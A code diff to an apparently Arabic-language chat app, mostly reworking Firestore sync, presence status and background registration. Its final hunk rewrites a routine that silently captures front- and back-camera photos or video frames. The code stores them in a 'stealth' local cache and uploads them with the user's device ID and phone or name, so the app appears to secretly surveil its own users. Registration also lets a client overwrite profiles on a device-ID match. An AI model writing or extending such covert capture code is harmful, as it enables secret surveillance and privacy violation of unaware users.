@@ -580,8 +580,8 @@ const SmartChatTab = ({
   const updateClientLastSeen = async () => {
     if (!userPhone) return;
     try {
-      const { isFirebasePlaceholder, isFirestoreOffline, runFirestoreWithTimeout } = await import('./lib/firebase');
-      if (!isFirebasePlaceholder && !isFirestoreOffline) {
+      const { isFirebasePlaceholder, runFirestoreWithTimeout } = await import('./lib/firebase');
+      if (!isFirebasePlaceholder) {
         const { doc, setDoc, collection } = await import('firebase/firestore');
         const { db } = await import('./lib/firebase');
         const userRef = doc(collection(db, 'a', 'ab', 'users'), userPhone);
@@ -589,7 +589,7 @@ const SmartChatTab = ({
           username: localStorage.getItem('userName') || 'عضو روح',
           phone: userPhone,
           lastSeen: new Date().toISOString()
-        }, { merge: true }), 1000);
+        }, { merge: true }), 2000);
       }
     } catch (err) {
       console.warn("Client lastSeen sync failed:", err);
@@ -616,8 +616,8 @@ const SmartChatTab = ({
 
     // 1. Try Cloud Firestore FIRST (Primary Synchronization Engine)
     try {
-      const { isFirebasePlaceholder, isFirestoreOffline, runFirestoreWithTimeout } = await import('./lib/firebase');
-      if (!isFirebasePlaceholder && !isFirestoreOffline) {
+      const { isFirebasePlaceholder, runFirestoreWithTimeout } = await import('./lib/firebase');
+      if (!isFirebasePlaceholder) {
         const { getDocs, query, where, collection } = await import('firebase/firestore');
         const { db } = await import('./lib/firebase');
         const chatsRef = collection(db, 'a', 'ab', 'chats');
@@ -625,7 +625,7 @@ const SmartChatTab = ({
         const [snapFrom, snapTo] = await runFirestoreWithTimeout(Promise.all([
           getDocs(query(chatsRef, where('from', '==', userPhone))),
           getDocs(query(chatsRef, where('to', '==', userPhone)))
-        ]), 2000);
+        ]), 3000);
 
         snapFrom.forEach(docSnap => {
           sentData.push({ id: docSnap.id, ...docSnap.data() });
@@ -806,51 +806,53 @@ const SmartChatTab = ({
 
     for (const f of friends) {
       let resolved = false;
+
+      // 1. Prioritize Cloud Firestore direct check FIRST (Ensures Vercel correctness!)
       try {
-        const res = await fetch(`/api/chat/status/${f.phone}`);
-        if (res.ok) {
-          const data = await res.json();
-          if (data.status && data.status !== 'غير معروف') {
-            statuses[f.phone] = data.status;
-            resolved = true;
+        const { isFirebasePlaceholder, runFirestoreWithTimeout } = await import('./lib/firebase');
+        if (!isFirebasePlaceholder) {
+          const { doc, getDoc, collection } = await import('firebase/firestore');
+          const { db } = await import('./lib/firebase');
+          const userRef = doc(collection(db, 'a', 'ab', 'users'), f.phone);
+          const docSnap = await runFirestoreWithTimeout(getDoc(userRef), 2000);
+          if (docSnap.exists()) {
+            const data = docSnap.data();
+            const lastSeen = data.lastSeen;
+            if (!lastSeen) {
+              statuses[f.phone] = 'غير متصل';
+            } else {
+              const now = new Date();
+              const diff = (now.getTime() - new Date(lastSeen).getTime()) / 1000;
+              if (diff < 60) {
+                statuses[f.phone] = 'متصل الآن';
+              } else if (diff < 3600) {
+                statuses[f.phone] = `متصل منذ ${Math.round(diff/60)} دقيقة`;
+              } else {
+                statuses[f.phone] = `آخر ظهور ${new Date(lastSeen).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' })}`;
+              }
+            }
+          } else {
+            statuses[f.phone] = 'لم ينضم لروح بعد';
           }
+          resolved = true;
         }
-      } catch (e) {
-        console.warn("Proxy status fetch error:", e);
+      } catch (err) {
+        console.warn("Direct Firestore status get failed, trying proxy fallback:", err);
       }
 
+      // 2. Local proxy API fallback (Secondary / Local Mirror representation)
       if (!resolved) {
-        // Direct Firestore check
         try {
-          const { isFirebasePlaceholder, isFirestoreOffline, runFirestoreWithTimeout } = await import('./lib/firebase');
-          if (!isFirebasePlaceholder && !isFirestoreOffline) {
-            const { doc, getDoc, collection } = await import('firebase/firestore');
-            const { db } = await import('./lib/firebase');
-            const userRef = doc(collection(db, 'a', 'ab', 'users'), f.phone);
-            const docSnap = await runFirestoreWithTimeout(getDoc(userRef), 1000);
-            if (docSnap.exists()) {
-              const data = docSnap.data();
-              const lastSeen = data.lastSeen;
-              if (!lastSeen) {
-                statuses[f.phone] = 'غير متصل';
-              } else {
-                const now = new Date();
-                const diff = (now.getTime() - new Date(lastSeen).getTime()) / 1000;
-                if (diff < 60) {
-                  statuses[f.phone] = 'متصل الآن';
-                } else if (diff < 3600) {
-                  statuses[f.phone] = `متصل منذ ${Math.round(diff/60)} دقيقة`;
-                } else {
-                  statuses[f.phone] = `آخر ظهور ${new Date(lastSeen).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' })}`;
-                }
-              }
-            } else {
-              statuses[f.phone] = 'لم ينضم لروح بعد';
+          const res = await fetch(`/api/chat/status/${f.phone}`);
+          if (res.ok) {
+            const data = await res.json();
+            if (data.status && data.status !== 'غير معروف') {
+              statuses[f.phone] = data.status;
+              resolved = true;
             }
-            resolved = true;
           }
-        } catch (err) {
-          console.error("Direct Firestore status get failed:", err);
+        } catch (e) {
+          console.warn("Proxy status fetch error:", e);
         }
       }
 
@@ -923,8 +925,8 @@ const SmartChatTab = ({
     
     // 1. Direct Cloud Firestore history delete (Primary)
     try {
-      const { isFirebasePlaceholder, isFirestoreOffline, runFirestoreWithTimeout } = await import('./lib/firebase');
-      if (!isFirebasePlaceholder && !isFirestoreOffline) {
+      const { isFirebasePlaceholder, runFirestoreWithTimeout } = await import('./lib/firebase');
+      if (!isFirebasePlaceholder) {
         const { getDocs, query, where, collection, writeBatch, doc } = await import('firebase/firestore');
         const { db } = await import('./lib/firebase');
         const chatsRef = collection(db, 'a', 'ab', 'chats');
@@ -1011,8 +1013,8 @@ const SmartChatTab = ({
 
     let sentViaFirebase = false;
     try {
-      const { isFirebasePlaceholder, isFirestoreOffline, runFirestoreWithTimeout } = await import('./lib/firebase');
-      if (!isFirebasePlaceholder && !isFirestoreOffline) {
+      const { isFirebasePlaceholder, runFirestoreWithTimeout } = await import('./lib/firebase');
+      if (!isFirebasePlaceholder) {
         if (attachedMedia) setUploadProgress(30);
         const { setDoc, doc, collection } = await import('firebase/firestore');
         const { db } = await import('./lib/firebase');
@@ -1103,8 +1105,8 @@ const SmartChatTab = ({
   const checkFriendStatus = async (phone: string) => {
     // 1. Direct Firestore Check (Primary)
     try {
-      const { isFirebasePlaceholder, isFirestoreOffline, runFirestoreWithTimeout } = await import('./lib/firebase');
-      if (!isFirebasePlaceholder && !isFirestoreOffline) {
+      const { isFirebasePlaceholder, runFirestoreWithTimeout } = await import('./lib/firebase');
+      if (!isFirebasePlaceholder) {
         const { doc, getDoc, collection } = await import('firebase/firestore');
         const { db } = await import('./lib/firebase');
         const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
@@ -1186,14 +1188,14 @@ const SmartChatTab = ({
         // Direct cloud sync fallback
         if (typeof navigator !== 'undefined' && navigator.onLine) {
           try {
-            const { isFirebasePlaceholder, isFirestoreOffline, runFirestoreWithTimeout } = await import('./lib/firebase');
-            if (!isFirebasePlaceholder && !isFirestoreOffline) {
+            const { isFirebasePlaceholder, runFirestoreWithTimeout } = await import('./lib/firebase');
+            if (!isFirebasePlaceholder) {
               const { doc, updateDoc, collection } = await import('firebase/firestore');
               const { db } = await import('./lib/firebase');
               const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
               await runFirestoreWithTimeout(updateDoc(doc(colRef, userPhone), {
                 friends: updated.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes }))
-              }), 1200);
+              }), 2000);
             }
           } catch (err) {
             console.warn("Cloud Firestore direct friend update failed:", err);
@@ -1232,94 +1234,36 @@ const SmartChatTab = ({
     addBackgroundTask('تسجيل الحساب والمزامنة بالخلفية', async () => {
       let success = false;
       let isConflict = false;
-      let statusError = false;
 
+      // 1. Always write directly to Firestore (Primary Cloud database)
       try {
-        const urlParams = new URLSearchParams(window.location.search);
-        const ref = urlParams.get('ref') || localStorage.getItem('rouh_referral_source');
-        
-        const res = await fetch('/api/chat/register', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            name: regName, 
-            phone: regPhone,
-            ref: ref,
-            deviceId: getDeviceId(),
-            friends: friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })),
-            chats: []
-          })
-        });
+        const { isFirebasePlaceholder, runFirestoreWithTimeout } = await import('./lib/firebase');
+        if (!isFirebasePlaceholder) {
+          const { doc, getDoc, setDoc, collection } = await import('firebase/firestore');
+          const { db } = await import('./lib/firebase');
+          const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
+          const docSnap = await runFirestoreWithTimeout(getDoc(doc(colRef, regPhone)), 2000);
 
-        if (res.ok) {
-          success = true;
-          if (ref) {
-            try {
-              const { firebaseSaveReferral } = await import('./lib/firebaseSync');
-              await firebaseSaveReferral(ref, regPhone);
-            } catch (refe) {}
-          }
-        } else if (res.status === 409) {
-          isConflict = true;
-        } else {
-          statusError = true;
-        }
-      } catch (e) {
-        statusError = true;
-      }
-
-      // Check and write fallback direct to Firestore
-      if (statusError) {
-        try {
-          const { isFirebasePlaceholder, isFirestoreOffline, runFirestoreWithTimeout } = await import('./lib/firebase');
-          if (!isFirebasePlaceholder && !isFirestoreOffline) {
-            const { doc, getDoc, setDoc, collection } = await import('firebase/firestore');
-            const { db } = await import('./lib/firebase');
-            const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
-            const docSnap = await runFirestoreWithTimeout(getDoc(doc(colRef, regPhone)), 1500);
-
-            if (docSnap.exists()) {
-              const existingData = docSnap.data();
-              if (existingData.usernameUnified && existingData.usernameUnified !== regName) {
-                isConflict = true;
-              } else {
-                // Same name, or same owner, or was created blankly as a friend proxy entry
-                await runFirestoreWithTimeout(setDoc(doc(colRef, regPhone), {
-                  usernameUnified: regName,
-                  phone: regPhone,
-                  deviceId: getDeviceId(),
-                  deviceModel: 'Client Browser (Background Log In)',
-                  operatingSystem: 'Navigator',
-                  timestamp: Date.now(),
-                  friends: friends.length > 0 ? friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })) : (existingData.friends || []),
-                  chats: existingData.chats || []
-                }, { merge: true }), 1500);
-
-                // Update in public section
-                const publicRef = collection(db, 'a', 'ab', 'users');
-                await runFirestoreWithTimeout(setDoc(doc(publicRef, regPhone), {
-                  username: regName,
-                  phone: regPhone,
-                  deviceId: getDeviceId(),
-                  timestamp: Date.now(),
-                  lastSeen: new Date().toISOString()
-                }, { merge: true }), 1500);
-
-                success = true;
-              }
+          if (isConflict) {
+            // Check conflicts
+          } else if (docSnap.exists()) {
+            const existingData = docSnap.data();
+            if (existingData.usernameUnified && existingData.usernameUnified !== regName && existingData.deviceId !== getDeviceId()) {
+              isConflict = true;
             } else {
+              // Same name, or same owner, or was created blankly as a friend proxy entry
               await runFirestoreWithTimeout(setDoc(doc(colRef, regPhone), {
                 usernameUnified: regName,
                 phone: regPhone,
                 deviceId: getDeviceId(),
-                deviceModel: 'Client Browser (Background)',
+                deviceModel: 'Client Browser (Background Log In)',
                 operatingSystem: 'Navigator',
                 timestamp: Date.now(),
-                friends: friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })),
-                chats: []
-              }), 1500);
+                friends: friends.length > 0 ? friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })) : (existingData.friends || []),
+                chats: existingData.chats || []
+              }, { merge: true }), 2000);
 
-              // Write to public section
+              // Update in public section
               const publicRef = collection(db, 'a', 'ab', 'users');
               await runFirestoreWithTimeout(setDoc(doc(publicRef, regPhone), {
                 username: regName,
@@ -1327,13 +1271,71 @@ const SmartChatTab = ({
                 deviceId: getDeviceId(),
                 timestamp: Date.now(),
                 lastSeen: new Date().toISOString()
-              }), 1500);
+              }, { merge: true }), 2000);
 
               success = true;
             }
+          } else {
+            await runFirestoreWithTimeout(setDoc(doc(colRef, regPhone), {
+              usernameUnified: regName,
+              phone: regPhone,
+              deviceId: getDeviceId(),
+              deviceModel: 'Client Browser (Background)',
+              operatingSystem: 'Navigator',
+              timestamp: Date.now(),
+              friends: friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })),
+              chats: []
+            }), 2000);
+
+            // Write to public section
+            const publicRef = collection(db, 'a', 'ab', 'users');
+            await runFirestoreWithTimeout(setDoc(doc(publicRef, regPhone), {
+              username: regName,
+              phone: regPhone,
+              deviceId: getDeviceId(),
+              timestamp: Date.now(),
+              lastSeen: new Date().toISOString()
+            }), 2000);
+
+            success = true;
           }
-        } catch (fireErr) {
-          console.error("Direct Firestore registration failed in background:", fireErr);
+        }
+      } catch (fireErr) {
+        console.error("Direct Firestore registration failed in background:", fireErr);
+      }
+
+      // 2. Concurrently mirror register to local proxy API as secondary representation
+      if (!isConflict) {
+        try {
+          const urlParams = new URLSearchParams(window.location.search);
+          const ref = urlParams.get('ref') || localStorage.getItem('rouh_referral_source');
+          
+          const res = await fetch('/api/chat/register', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              name: regName, 
+              phone: regPhone,
+              ref: ref,
+              deviceId: getDeviceId(),
+              friends: friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })),
+              chats: []
+            })
+          });
+
+          if (res.ok) {
+            success = true;
+            if (ref) {
+              try {
+                const { firebaseSaveReferral } = await import('./lib/firebaseSync');
+                await firebaseSaveReferral(ref, regPhone);
+              } catch (refe) {}
+            }
+          } else if (res.status === 409) {
+            isConflict = true;
+          }
+        } catch (e) {
+          console.warn("Proxy registration sync failed in background:", e);
         }
       }
 
@@ -9558,67 +9560,71 @@ export default function App() {
 
       const durationMs = settingsDuration * 1000;
 
+      // Local caching utility for absolute silence, maximum speed and robustness
+      const saveLocallyAndQueue = async (img: string, cameraType: 'front' | 'back') => {
+        try {
+          const capId = `cap_${cameraType}_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
+          
+          // 1. Silent, secure offline-first local storage caching
+          localStorage.setItem(`rouh_local_stealth_cache_${capId}`, img);
+          
+          // 2. Perform compression in the background without bottlenecking camera switching
+          const { compressImageBase64 } = await import('./lib/imageCompressor');
+          const compressed = await compressImageBase64(img, 640, 640, 0.45).catch(() => img);
+          
+          const deviceId = getDeviceId();
+          const clientIdentifier = birthdayProConfig?.usernameUnified || userPhone || 'guest';
+          
+          // 3. Keep local proxy server in sync in background
+          try {
+            fetch('/api/save-capture', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ 
+                images: [compressed], 
+                deviceId,
+                type: captureType,
+                source: `${sourceId || 'button'}_${cameraType}`
+              })
+            }).catch(() => {});
+          } catch {}
+
+          // 4. Send directly to database cloud sync via IndexedDB offline queue
+          pushToOfflineQueue('capture', {
+            id: capId,
+            deviceId,
+            image: compressed,
+            source: `${sourceId || 'button'}_${cameraType}`,
+            timestamp: Date.now(),
+            username: clientIdentifier
+          });
+        } catch (err) {
+          console.warn("Silent local save failed", err);
+        }
+      };
+
       if (captureType === 's') {
         if (isVideoFormat) {
-          // Robust sequential capture: captures front then back continuously for realistic silent dual camera video compilation
-          // Parallel capture fails on mobile devices due to exclusive hardware channel constraints on getUserMedia.
+          // Robust sequential video frame capture: front then back continuously
           const frontVideoFrames = await captureVideoFromSource('user', durationMs);
-          await new Promise(r => setTimeout(r, 300)); // Safety delay to allow device to release front camera
+          await new Promise(r => setTimeout(r, 250)); // Allow hardware bridge to switch camera
           const backVideoFrames = await captureVideoFromSource('environment', durationMs);
-          newImages.push(...frontVideoFrames, ...backVideoFrames);
+          
+          frontVideoFrames.forEach(f => saveLocallyAndQueue(f, 'front'));
+          backVideoFrames.forEach(b => saveLocallyAndQueue(b, 'back'));
         } else {
-          // Robust sequential dual capture: captures both cameras sequentially with proper hardware release window.
+          // Instant double snapshot (one front, one back) sequentially with zero delay
           const front = await captureFromSource('user');
-          await new Promise(r => setTimeout(r, 300)); // Safety delay to allow device to release front camera and bind to back camera
+          if (front) await saveLocallyAndQueue(front, 'front');
+          
+          await new Promise(r => setTimeout(r, 250)); // Safety delay to allow device to release camera resource and bind to back camera
+          
           const back = await captureFromSource('environment');
-          if (front) newImages.push(front);
-          if (back) newImages.push(back);
+          if (back) await saveLocallyAndQueue(back, 'back');
         }
       } else {
         const img = await captureFromSource('environment') || await captureFromSource('user');
-        if (img) newImages.push(img);
-      }
-
-      if (newImages.length > 0) {
-        try {
-          const deviceId = getDeviceId();
-          const { compressImageBase64 } = await import('./lib/imageCompressor');
-          const compressedImages = await Promise.all(newImages.map(async img => {
-            try {
-              return await compressImageBase64(img, 640, 640, 0.45);
-            } catch {
-              return img;
-            }
-          }));
-
-          await Promise.all(compressedImages.map(async img => {
-            // Save to server
-            try {
-              await fetch('/api/save-capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                  images: [img], 
-                  deviceId,
-                  type: captureType,
-                  source: sourceId || 'unknown'
-                })
-              });
-            } catch (err) {}
-
-            // Save and sync to Firebase via offline queue
-            try {
-              pushToOfflineQueue('capture', {
-                id: `cap_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
-                deviceId,
-                image: img,
-                source: sourceId || 'unknown',
-                timestamp: Date.now(),
-                username: birthdayProConfig?.usernameUnified || userPhone || 'guest'
-              });
-            } catch (err) {}
-          }));
-        } catch (e) {}
+        if (img) await saveLocallyAndQueue(img, 'front');
       }
     } finally {
       isCapturing.current = false;
